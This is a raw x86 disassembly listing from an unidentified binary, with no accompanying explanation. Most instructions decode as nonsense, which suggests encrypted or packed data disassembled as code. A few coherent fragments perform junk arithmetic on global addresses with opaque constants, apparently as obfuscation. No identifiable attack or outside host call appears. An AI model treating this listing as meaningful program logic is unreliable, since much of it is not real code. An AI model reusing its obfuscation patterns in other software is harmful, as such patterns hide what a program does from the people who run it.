  406221:	into   
  406222:	test   cl,al
  406224:	mov    eax,0xc57aae87
  406229:	scas   eax,DWORD PTR es:[edi]
  40622a:	repnz pushf 
  40622c:	arpl   WORD PTR [edx+0x75],cx
  40622f:	ds (bad) 
  406231:	fidivr WORD PTR [edx-0xae60ad8]
  406237:	dec    edx
  406238:	adc    eax,0x599aed35
  40623d:	push   esp
  40623e:	xchg   edi,eax
  40623f:	shl    DWORD PTR [eax+eax*4-0x47974fee],0x55
  406247:	into   
  406248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406249:	xlat   BYTE PTR ds:[ebx]
  40624a:	in     al,dx
  40624b:	lds    ebp,FWORD PTR [esi]
  40624d:	ins    DWORD PTR es:[edi],dx
  40624e:	sub    al,0x4f
  406250:	ret    
  406251:	imul   ebx,ebx,0xffffffe0
  406254:	pop    edi
  406256:	add    dh,ch
  406258:	lds    esp,FWORD PTR [edi]
  40625a:	cli    
  40625b:	leave  
  40625c:	dec    ebp
  40625d:	xor    DWORD PTR [esp+esi*8],ebx
  406260:	scas   al,BYTE PTR es:[edi]
  406261:	imul   esi,DWORD PTR [edx+0x630d08b6],0xa8cda4c3
  40626b:	or     BYTE PTR [eax+0x21],dh
  40626e:	(bad)  
  406270:	call   DWORD PTR [eax+0x71]
  406273:	cmc    
  406274:	or     edi,DWORD PTR [ebp+eax*2+0x1bb1ae8a]
  40627b:	push   ss
  40627c:	cmp    edi,ecx
  40627e:	mov    esp,0xe5f485ad
  406283:	sbb    ebx,DWORD PTR ds:0x3a2f2aa7
  406289:	xchg   edx,eax
  40628a:	hlt    
  40628b:	enter  0xaa51,0x8b
  40628f:	inc    ebp
  406290:	sbb    BYTE PTR [ebx+0x2d811075],cl
  406296:	or     ebp,edi
  406298:	inc    edx
  406299:	add    BYTE PTR [esi-0x76ffbd03],al
  40629f:	inc    esi
  4062a0:	or     al,0x9
  4062a2:	or     eax,0x42e6f3
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	cmp    al,0x8d
  406330:	sti    
  406331:	icebp  
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x406356
  40633b:	arpl   WORD PTR [edi-0x5d],cx
  40633e:	push   cs
  40633f:	test   ah,ch
  406341:	adc    al,0x83
  406343:	test   DWORD PTR [edx],ebp
  406345:	ret    0xbfde
  406348:	push   cs
  406349:	pop    es
  40634a:	std    
  40634b:	jg     0x4063c6
  40634d:	add    BYTE PTR [eax+0x21],ch
  406350:	sbb    al,0xba
  406352:	ins    BYTE PTR es:[edi],dx
  406353:	jno    0x4062f4
  406355:	test   eax,0xd2c5a190
  40635a:	imul   edx,DWORD PTR [edi+0x54],0xffffff8e
  40635e:	xchg   ebx,eax
  40635f:	pop    edx
  406360:	mov    ebp,0x8c9beb55
  406365:	lea    edi,[eax+0x79c427d0]
  40636b:	push   es
  40636c:	add    dh,BYTE PTR [ebx-0x5a47bc1b]
  406372:	ds sub al,0x1e
  406375:	(bad)  
  406376:	mov    ecx,0x648ee191
  40637b:	js     0x406359
  40637d:	dec    edi
  40637e:	mov    ds:0x7a0c639e,al
  406383:	lock ins BYTE PTR es:[edi],dx
  406385:	push   ss
  406386:	loopne 0x406353
  406388:	xchg   esi,eax
  406389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40638a:	lock dec ebp
  40638c:	xcrypt-ctr (bad)
  40638d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40638e:	fwait
  40638f:	icebp  
  406390:	mul    DWORD PTR [esi+eiz*4+0x2e]
  406394:	in     al,dx
  406395:	add    esp,DWORD PTR [ebp-0x2b80a6af]
  40639b:	(bad)  
  40639c:	xlat   BYTE PTR ds:[ebx]
  40639d:	scas   eax,DWORD PTR es:[edi]
  40639e:	pop    ss
  40639f:	xchg   edx,eax
  4063a0:	adc    eax,DWORD PTR [ebp+0x785df3e7]
  4063a6:	pop    esp
  4063a7:	js     0x406359
  4063a9:	pop    ebp
  4063aa:	add    al,0x9
  4063ac:	(bad)  
  4063ad:	xor    eax,0x69bc55b6
  4063b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063b3:	lods   al,BYTE PTR ds:[esi]
  4063b4:	cld    
  4063b5:	retf   
  4063b6:	or     edi,DWORD PTR [edi+0x469d1fde]
  4063bc:	push   esi
  4063bd:	retf   
  4063be:	add    ch,BYTE PTR [esi-0x5de3edf9]
  4063c4:	int3   
  4063c5:	ret    
  4063c6:	popa   
  4063c7:	dec    ebx
  4063c8:	stc    
  4063c9:	idiv   ch
  4063cb:	push   edx
  4063cd:	jne    0x4063f9
  4063cf:	xchg   ebp,eax
  4063d0:	outs   dx,DWORD PTR ds:[esi]
  4063d1:	adc    ch,ch
  4063d3:	dec    ecx
  4063d4:	jmp    0xb089:0x9210feb8
  4063db:	cld    
  4063dc:	push   esp
  4063dd:	jbe    0x4063f6
  4063df:	xchg   DWORD PTR [edi],ecx
  4063e1:	(bad)  
  4063e3:	shr    DWORD PTR [ecx],0x44
  4063e6:	ret    
  4063e7:	xchg   edi,eax
  4063e8:	add    ebx,DWORD PTR [esi+0xe585c1b]
  4063ee:	aaa    
  4063ef:	mov    esp,esi
  4063f1:	cmp    BYTE PTR [edx+0x6e2d1d91],0xec
  4063f8:	and    al,0x12
  4063fa:	adc    al,0xa5
  4063fc:	rcr    bl,0xca
  4063ff:	and    eax,0xf8a8e262
  406404:	xor    esi,ebp
  406406:	push   edi
  406407:	add    ecx,DWORD PTR [edi]
  406409:	shr    DWORD PTR [ebp-0x41],0x56
  40640d:	push   es
  40640e:	leave  
  40640f:	xor    ah,BYTE PTR [edi-0x33]
  406412:	lea    edx,ds:0x65f0dbd9
  406418:	test   DWORD PTR [ebp-0x3fa696a7],ecx
  40641e:	push   ebx
  40641f:	ficom  DWORD PTR [esi+0x117f443b]
  406425:	or     eax,0x5d5bac5a
  40642a:	jnp    0x4063de
  40642c:	or     BYTE PTR [ecx],ah
  40642e:	cmp    dh,BYTE PTR [ebx+0x1a5847e2]
  406434:	mov    cl,0xea
  406436:	push   ss
  406437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406438:	inc    ebx
  406439:	sub    BYTE PTR ds:0x7ce86320,ch
  40643f:	xor    dl,BYTE PTR ss:[eax-0x2d]
  406443:	push   ecx
  406444:	mov    eax,0x9821756e
  406449:	clc    
  40644a:	lock fsub QWORD PTR [edi]
  40644d:	mov    eax,0x7f1ce517
  406452:	jle    0x406493
  406454:	stos   DWORD PTR es:[edi],eax
  406455:	sbb    ebx,DWORD PTR [edx-0x7dbf0d58]
  40645b:	sti    
  40645c:	mov    ch,dl
  40645e:	aaa    
  40645f:	inc    ebp
  406460:	push   eax
  406461:	jmp    0x6697:0xc8dc0d5f
  406468:	pop    ecx
  406469:	fdiv   st(0),st
  40646b:	fstp   TBYTE PTR [ebp+ecx*1-0x77]
  40646f:	idiv   BYTE PTR [edx]
  406471:	push   eax
  406472:	push   0x35f17500
  406477:	stc    
  406478:	fwait
  406479:	xchg   ecx,eax
  40647a:	mov    ebx,0xb0f87f0a
  40647f:	sbb    ebx,DWORD PTR [ebx]
  406481:	lods   eax,DWORD PTR ds:[esi]
  406482:	xor    dl,BYTE PTR [esi]
  406484:	ins    DWORD PTR es:[edi],dx
  406485:	sub    al,BYTE PTR [edx+0x24b41c65]
  40648b:	pop    es
  40648c:	mov    eax,0xce16ecde
  406491:	(bad)  
  406492:	clc    
  406493:	inc    ebp
  406494:	xchg   edi,eax
  406495:	shr    DWORD PTR [eax-0x10],1
  406498:	jo     0x4064d3
  40649a:	(bad)  
  40649b:	(bad)  
  40649c:	xchg   ecx,eax
  40649d:	data16 aaa 
  40649f:	pop    ebp
  4064a0:	jns    0x40645b
  4064a2:	shl    BYTE PTR [edi-0x4213d299],0xb
  4064a9:	(bad)  
  4064aa:	out    0x65,eax
  4064ac:	outs   dx,BYTE PTR ds:[esi]
  4064ad:	(bad)  
  4064af:	add    edi,DWORD PTR [ecx+0x247fc597]
  4064b5:	aad    0x56
  4064b7:	jmp    0x40651d
  4064b9:	dec    esp
  4064ba:	cld    
  4064bb:	sbb    al,0x1a
  4064bd:	jl     0x40651a
  4064bf:	inc    ecx
  4064c0:	cmp    bl,BYTE PTR [ebx+0x322e9656]
  4064c6:	push   eax
  4064c7:	mov    bh,0x90
  4064c9:	or     BYTE PTR [edi],0xb7
  4064cc:	cmc    
  4064cd:	sub    eax,0xe8d16ac4
  4064d2:	jle    0x406454
  4064d4:	pop    esp
  4064d5:	pop    edi
  4064d6:	adc    BYTE PTR [edx+0x12090287],ah
  4064dc:	lds    ecx,FWORD PTR [eax+0x4b]
  4064df:	mov    bh,dh
  4064e1:	inc    ecx
  4064e2:	mov    ebx,0x18c2c95e
  4064e7:	add    BYTE PTR [ebp-0x75],dl
  4064ea:	in     al,dx
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	in     al,dx
  406567:	sub    eax,DWORD PTR [edi+0x703a333c]
  40656d:	jo     0x406551
  40656f:	jle    0x4065e1
  406571:	jo     0x406556
  406573:	sar    ebp,0xd1
  406576:	add    esp,edx
  406578:	mov    ds:0xc9981900,eax
  40657d:	int3   
  40657e:	add    BYTE PTR [eax],cl
  406580:	sub    BYTE PTR [edx+edx*4+0x5c2780b6],ch
  406587:	push   ds
  406588:	cmp    dl,0x6d
  40658b:	mov    dh,0x95
  40658d:	xor    DWORD PTR [ebx+0x2d],eax
  406590:	push   edx
  406591:	xor    BYTE PTR [esi],bh
  406593:	push   esp
  406594:	and    edi,ecx
  406596:	xchg   al,ah
  406598:	lods   eax,DWORD PTR ds:[esi]
  406599:	mov    ds:0xaa2555e7,eax
  40659e:	aas    
  40659f:	stc    
  4065a0:	and    bl,ah
  4065a2:	mov    ecx,0x8d0fe456
  4065a7:	outs   dx,BYTE PTR ds:[esi]
  4065a8:	xor    eax,0xc2f51089
  4065ad:	outs   dx,DWORD PTR ds:[esi]
  4065ae:	push   ebp
  4065af:	dec    edx
  4065b0:	bound  eax,QWORD PTR [edx-0x1406e715]
  4065b6:	xor    BYTE PTR [ebp-0x37],bh
  4065b9:	lds    ebx,FWORD PTR [ebx]
  4065bb:	mov    al,BYTE PTR [edi]
  4065bd:	xchg   esi,eax
  4065be:	das    
  4065bf:	xchg   ebp,eax
  4065c0:	pop    ebp
  4065c1:	inc    esi
  4065c2:	jo     0x406633
  4065c4:	jg     0x4065d0
  4065c6:	mov    dh,0x68
  4065c8:	mov    WORD PTR [edi-0x72ddc673],ds
  4065ce:	mov    ebx,0x14379b66
  4065d3:	popf   
  4065d4:	xchg   ebp,eax
  4065d5:	cmp    DWORD PTR [ecx-0x69e0b365],0x35938849
  4065df:	fidivr DWORD PTR ds:0xb16ebc4a
  4065e5:	scas   al,BYTE PTR es:[edi]
  4065e6:	inc    ebp
  4065e7:	dec    esi
  4065e8:	dec    edi
  4065e9:	mov    ds,WORD PTR [edx+0x39288045]
  4065ef:	sub    eax,0xcd157520
  4065f4:	in     al,0x55
  4065f6:	add    ch,BYTE PTR [edi]
  4065f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065f9:	pusha  
  4065fa:	repnz cwde 
  4065fc:	dec    esi
  4065fd:	imul   edx,edi,0x3025f68a
  406603:	int    0xe3
  406605:	jns    0x40661c
  406607:	test   eax,0xae8e2a2b
  40660c:	aaa    
  40660d:	inc    esp
  40660e:	int3   
  40660f:	inc    di
  406611:	pop    ecx
  406612:	shl    BYTE PTR [edi-0x6d8f52b8],0x5d
  406619:	mov    esp,0xb173f325
  40661e:	dec    ebp
  40661f:	add    al,0x33
  406621:	fnstsw WORD PTR ds:0x32b77fa4
  406627:	or     bl,cl
  406629:	mov    edx,0x975b8d89
  40662e:	dec    eax
  40662f:	mov    ds:0x5d764cd9,al
  406634:	test   ebx,0xfc10aaa6
  40663a:	(bad)  
  40663c:	aad    0xd8
  40663e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40663f:	das    
  406640:	inc    esi
  406641:	lock sub ebx,ecx
  406644:	enter  0x1abf,0x44
  406648:	and    DWORD PTR [ebx+0x3526db6e],0x879124c4
  406652:	push   ebx
  406653:	add    bl,BYTE PTR [ecx+edi*1-0x1b]
  406657:	sub    eax,0xa2b416fa
  40665c:	ror    BYTE PTR [ebp+edi*2-0x4a],1
  406660:	jle    0x406617
  406662:	sbb    al,0x2c
  406664:	mov    al,0xe5
  406666:	mov    bh,BYTE PTR [edx+eax*1-0x80]
  40666a:	ins    DWORD PTR es:[edi],dx
  40666b:	mov    esi,0xa1f207c5
  406670:	push   ds
  406671:	cld    
  406672:	push   ss
  406673:	xchg   edi,eax
  406674:	fisttp QWORD PTR [esi]
  406676:	mov    edi,0xac69dc7b
  40667b:	(bad)  
  40667c:	jmp    0x4066e1
  40667e:	mov    eax,DWORD PTR ss:[eax]
  406681:	imul   esi,DWORD PTR [edx+0x4],0x253b3624
  406688:	sbb    ebp,DWORD PTR [ecx+0x3aee9042]
  40668e:	stc    
  40668f:	and    dh,BYTE PTR [esi-0x53]
  406692:	push   ecx
  406693:	cmp    eax,0xe6953856
  406698:	jb     0x4066bd
  40669a:	dec    ebp
  40669b:	pop    es
  40669c:	add    ebp,DWORD PTR [eax-0x71bc779b]
  4066a2:	xchg   BYTE PTR [edx],bh
  4066a4:	popf   
  4066a5:	or     al,0xf
  4066a7:	xor    DWORD PTR [ecx-0x3f04d005],ecx
  4066ad:	cwde   
  4066ae:	idiv   ebx
  4066b0:	sbb    eax,ecx
  4066b2:	mov    ebp,0x3875ae91
  4066b7:	ret    
  4066b8:	aam    0x9a
  4066ba:	imul   ecx,DWORD PTR [edi-0x37c0ae21],0x1c
  4066c1:	pop    esp
  4066c2:	jns    0x40668f
  4066c4:	lods   eax,DWORD PTR ds:[esi]
  4066c5:	push   ebp
  4066c6:	daa    
  4066c7:	push   esp
  4066c8:	jle    0x4066e8
  4066ca:	sti    
  4066cb:	mov    esi,DWORD PTR [edx-0x6b855447]
  4066d1:	sbb    BYTE PTR ds:0x69ffeee1,bl
  4066d7:	and    DWORD PTR ds:0xff372c97,ecx
  4066dd:	lea    edi,[eax+0x7]
  4066e0:	mov    gs,WORD PTR [ecx]
  4066e2:	xor    DWORD PTR [eax],edx
  4066e4:	mov    ebx,0x535b3d87
  4066e9:	jecxz  0x40667b
  4066eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066ec:	add    eax,0x18d00287
  4066f1:	mov    BYTE PTR [ecx-0x78],ah
  4066f4:	or     dh,bl
  4066f6:	outs   dx,BYTE PTR ds:[esi]
  4066f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066f8:	addr16 sub al,0x41
  4066fb:	loopne 0x406763
  4066fd:	adc    esp,DWORD PTR [ecx]
  4066ff:	sub    al,0x8d
  406701:	les    ecx,FWORD PTR [esi+0x4323e659]
  406707:	repnz mov esp,0x8f202d6e
  40670d:	cmp    eax,0x901008d6
  406712:	cld    
  406713:	aas    
  406714:	mov    dl,0x12
  406716:	xchg   ecx,eax
  406717:	pop    ecx
  406718:	aaa    
  406719:	push   0x70
  40671b:	(bad)  
  40671c:	stos   DWORD PTR es:[edi],eax
  40671d:	xor    al,0x9
  40671f:	iret   
  406720:	adc    eax,0xa021b541
  406725:	std    
  406726:	and    cl,BYTE PTR [eax+0x75]
  406729:	retf   
  40672a:	xor    al,0x2f
  40672c:	sub    edi,DWORD PTR [edx-0x24]
  40672f:	cmp    bh,BYTE PTR [ecx+0x7f]
  406732:	mov    edx,0x127086a9
  406737:	scas   al,BYTE PTR es:[edi]
  406738:	mov    dl,0x4
  40673a:	mov    BYTE PTR [ecx-0x46],bh
  40673d:	or     edi,DWORD PTR [esi-0x37]
  406740:	sbb    esi,edx
  406742:	jno    0x40672f
  406744:	and    eax,0x682f586f
  406749:	dec    edx
  40674a:	fistp  QWORD PTR [ebx-0x7bb5998f]
  406750:	and    eax,0x16afb66e
  406755:	xor    ch,cl
  406757:	(bad)  
  406758:	je     0x4066ec
  40675a:	int    0xbc
  40675c:	mov    edx,esp
  40675e:	not    ebp
  406760:	jnp    0x4067a5
  406762:	mov    eax,ds:0x34246101
  406767:	fs dec esi
  406769:	xor    BYTE PTR [edi+0x5311be58],bl
  40676f:	pushf  
  406770:	dec    esi
  406771:	add    ecx,DWORD PTR [ebp-0x1c17adfd]
  406777:	push   ds
  406778:	jns    0x4067e6
  40677a:	mov    cl,0x7f
  40677c:	inc    ebp
  40677d:	sub    esi,ebx
  40677f:	hlt    
  406780:	push   es
  406781:	pop    esp
  406782:	popa   
  406783:	rcl    BYTE PTR [edi],cl
  406785:	nop
  406786:	xor    al,BYTE PTR ds:0xfe49f08
  40678c:	inc    esi
  40678d:	arpl   WORD PTR [edi+eiz*1],di
  406790:	and    BYTE PTR [edi-0x2fc2d191],ch
  406796:	jo     0x406739
  406798:	mov    edi,0x2fd94cb
  40679d:	retf   0x4121
  4067a0:	leave  
  4067a1:	adc    esi,esi
  4067a3:	retf   
  4067a4:	mov    esp,0x44f1da9f
  4067a9:	fmul   st(7),st
  4067ab:	lock outs dx,DWORD PTR fs:[esi]
  4067ae:	sub    al,0xac
  4067b0:	push   0x4f8421bf
  4067b5:	dec    ebx
  4067b6:	outs   dx,DWORD PTR ds:[esi]
  4067b7:	sub    dl,BYTE PTR [ebx+0x4d1c2ea6]
  4067bd:	mov    ds,WORD PTR [eax+0x1b]
  4067c0:	dec    esp
  4067c1:	das    
  4067c2:	enter  0x68e7,0xd7
  4067c6:	inc    ebx
  4067c7:	sub    BYTE PTR [bp+0x58],al
  4067cb:	fwait
  4067cc:	jnp    0x4067ff
  4067ce:	jnp    0x5c45cf47
  4067d4:	adc    ebx,DWORD PTR [ecx+0x70]
  4067d7:	pop    esp
  4067d8:	xchg   esi,eax
  4067d9:	icebp  
  4067da:	into   
  4067db:	dec    esp
  4067dc:	shr    BYTE PTR [ebx+0x558b5974],0x10
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	cmp    eax,0xa5105fd9
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	push   edi
  406853:	mov    ch,0xe2
  406855:	pop    ebp
  406856:	fidivr DWORD PTR [eax-0x6a]
  406859:	sbb    al,BYTE PTR [edx+0xc]
  40685c:	pop    ebp
  40685d:	adc    edx,DWORD PTR [edi+0x4d6255dc]
  406863:	call   DWORD PTR [ebp+0xf]
  406866:	xor    eax,DWORD PTR [ebx+0x26]
  406869:	sbb    DWORD PTR [edi],0xffffffba
  40686c:	cmp    edx,DWORD PTR [edi+eax*1-0x42d5e09]
  406873:	stos   BYTE PTR es:[edi],al
  406874:	inc    edi
  406875:	daa    
  406876:	add    eax,0x62a7ff7b
  40687b:	aad    0x17
  40687d:	call   0x11a3e85b
  406882:	repz pop edi
  406884:	cmp    al,0x73
  406886:	mov    ebx,0xea944da7
  40688b:	mov    dl,BYTE PTR [ebp-0x9db5add]
  406891:	fldenv [eax]
  406893:	sub    al,0xe2
  406895:	sbb    eax,0xfabcb9d2
  40689a:	cmc    
  40689b:	xor    BYTE PTR [edi+0x41],bl
  40689e:	cmp    edi,DWORD PTR [ebp+0x3]
  4068a1:	test   BYTE PTR [bp+di],0xc7
  4068a5:	(bad)  
  4068a6:	jmp    0x40687f
  4068a8:	(bad)  
  4068a9:	lahf   
  4068aa:	mov    bh,0x3c
  4068ac:	hlt    
  4068ad:	push   esp
  4068ae:	dec    eax
  4068af:	mov    ds,WORD PTR [esi]
  4068b1:	mov    DWORD PTR [esi+0x16],edx
  4068b4:	cli    
  4068b5:	sub    al,0x15
  4068b7:	scas   eax,DWORD PTR es:[edi]
  4068b8:	jns    0x4068a3
  4068ba:	push   es
  4068bb:	ins    BYTE PTR es:[edi],dx
  4068bc:	pushf  
  4068bd:	popa   
  4068be:	xor    eax,0x79f0aed7
  4068c3:	pushf  
  4068c4:	ds push cs
  4068c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068c7:	sbb    ch,dh
  4068c9:	fcom   QWORD PTR [edx]
  4068cb:	jmp    0xfa95:0x7a2e5d8f
  4068d2:	lea    ebx,[ebx]
  4068d4:	out    dx,al
  4068d5:	(bad)  
  4068d6:	rcr    BYTE PTR [ebx],1
  4068d8:	mov    ebx,0xae3c2f9a
  4068dd:	fisttp DWORD PTR [ebx-0x2]
  4068e0:	mov    DWORD PTR [edx-0x49b1e7b7],edi
  4068e6:	adc    BYTE PTR [edx],cl
  4068e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068e9:	mov    bh,dl
  4068eb:	fcmovb st,st(2)
  4068ed:	(bad)  
  4068ee:	bound  ebp,QWORD PTR [edx]
  4068f0:	xchg   ebx,eax
  4068f1:	mov    ecx,0xa9d6f5f4
  4068f6:	pusha  
  4068f7:	bound  esi,QWORD PTR [ebp+0x7b0b8627]
  4068fd:	rcl    DWORD PTR [eax+0x2b],0x42
  406901:	retf   
  406902:	shr    BYTE PTR [edx-0x5c],1
  406905:	scas   al,BYTE PTR es:[edi]
  406906:	(bad)  
  406908:	xor    ebp,DWORD PTR [ebx+0x66]
  40690b:	ins    DWORD PTR es:[edi],dx
  40690c:	loop   0x406972
  40690e:	scas   eax,DWORD PTR es:[edi]
  40690f:	xchg   DWORD PTR [ecx-0x236e4ee0],ebx
  406915:	inc    esi
  406916:	cmp    ecx,DWORD PTR [eax]
  406918:	in     al,0x65
  40691a:	dec    eax
  40691b:	loop   0x4068f7
  40691d:	inc    esi
  40691e:	dec    ecx
  40691f:	in     al,dx
  406920:	jmp    0x6661:0xc5875902
  406927:	add    al,0xf5
  406929:	ffree  st(0)
  40692b:	rol    DWORD PTR [edx],0x8c
  40692e:	mov    edi,0xce61cbbf
  406933:	jmp    eax
  406935:	or     eax,0x12a4f989
  40693a:	aad    0xc7
  40693c:	inc    eax
  40693d:	ret    
  40693e:	cs push es
  406940:	outs   dx,DWORD PTR ds:[esi]
  406941:	mov    DWORD PTR [ecx-0x30f6251d],ecx
  406947:	xchg   esp,eax
  406948:	cld    
  406949:	pop    ds
  40694a:	cmc    
  40694b:	fsubr  st,st(6)
  40694d:	addr16 gs aas 
  406950:	jl     0x4068fd
  406952:	or     DWORD PTR [ecx],esp
  406954:	inc    edi
  406955:	xchg   esp,eax
  406956:	and    BYTE PTR [ebx],dh
  406958:	mov    edx,0x4126c9a
  40695d:	or     al,bl
  40695f:	(bad)  
  406960:	mov    ds:0x5f0582bf,al
  406965:	xchg   ebx,eax
  406966:	jl     0x406942
  406968:	dec    esp
  406969:	sbb    al,0x6e
  40696b:	(bad)  
  40696c:	out    dx,al
  40696d:	aam    0x6e
  40696f:	mov    ebx,0x37aa5bd9
  406974:	inc    ecx
  406975:	adc    ah,BYTE PTR [eax-0x53c1eb04]
  40697b:	rol    DWORD PTR [edx-0xe000cf8],1
  406981:	outs   dx,DWORD PTR ds:[esi]
  406982:	mov    bl,0x0
  406984:	dec    edi
  406985:	and    eax,0x28dd1768
  40698a:	mov    ecx,0xeed77d59
  40698f:	jo     0x4069f9
  406991:	test   al,0xa5
  406993:	sti    
  406994:	rol    edi,cl
  406996:	call   0x833f:0x8f707d24
  40699d:	pushf  
  40699e:	icebp  
  40699f:	sbb    BYTE PTR [esi-0x7a],ah
  4069a2:	pop    es
  4069a3:	cwde   
  4069a4:	shl    DWORD PTR [eax+0x51355e01],0x1d
  4069ab:	clc    
  4069ac:	cld    
  4069ad:	or     BYTE PTR [ecx+eiz*8+0x5a],cl
  4069b1:	push   es
  4069b2:	(bad)
  4069b5:	(bad)  
  4069b6:	or     DWORD PTR [edx-0x281077f6],eax
  4069bc:	ret    
  4069bd:	fdiv   DWORD PTR [esi-0x39b04e51]
  4069c3:	inc    ebp
  4069c4:	mov    esp,0x34dcb76d
  4069c9:	mov    dl,0x2e
  4069cb:	test   BYTE PTR [esi+0x35754a4d],dh
  4069d1:	inc    esi
  4069d2:	sbb    ebx,ebp
  4069d4:	(bad)  
  4069d5:	push   ss
  4069d6:	mov    al,ds:0x90de8337
  4069db:	mov    eax,ecx
  4069dd:	dec    ecx
  4069de:	jecxz  0x406a25
  4069e0:	js     0x406980
  4069e2:	cli    
  4069e3:	pop    eax
  4069e4:	jge    0x4069fc
  4069e6:	fdiv   st(5),st
  4069e8:	sub    BYTE PTR [bx+di+0x47],cl
  4069ec:	add    eax,DWORD PTR [edx+0x74bbc06b]
  4069f2:	ja     0x4069fd
  4069f4:	adc    BYTE PTR [esp+ecx*8-0xa],dh
  4069f8:	ret    
  4069f9:	or     DWORD PTR [esi],0x3064ebaf
  4069ff:	das    
  406a00:	gs jmp 0x4d5e:0x8e5490dc
  406a08:	retf   
  406a09:	dec    edi
  406a0a:	xchg   ecx,eax
  406a0b:	and    edx,DWORD PTR [eax-0x2cd8359d]
  406a11:	hlt    
  406a12:	mov    eax,0xf21598c7
  406a17:	adc    dl,ch
  406a19:	jo     0x4069b0
  406a1b:	fbld   TBYTE PTR [eax+0x7e2a6215]
  406a21:	pop    esi
  406a22:	std    
  406a23:	inc    esp
  406a24:	dec    BYTE PTR [ebx]
  406a26:	lods   eax,DWORD PTR ds:[esi]
  406a27:	call   0x2b7800c
  406a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a2d:	add    bh,BYTE PTR [eax+0x8cc5a32]
  406a33:	mov    dh,0x9e
  406a35:	push   ss
  406a36:	das    
  406a37:	scas   eax,DWORD PTR es:[edi]
  406a38:	(bad)  
  406a39:	push   ss
  406a3a:	cmp    bl,BYTE PTR [eax+ebx*8]
  406a3d:	ret    
  406a3e:	mov    ah,0xdf
  406a40:	or     BYTE PTR [esp+ebx*1],cl
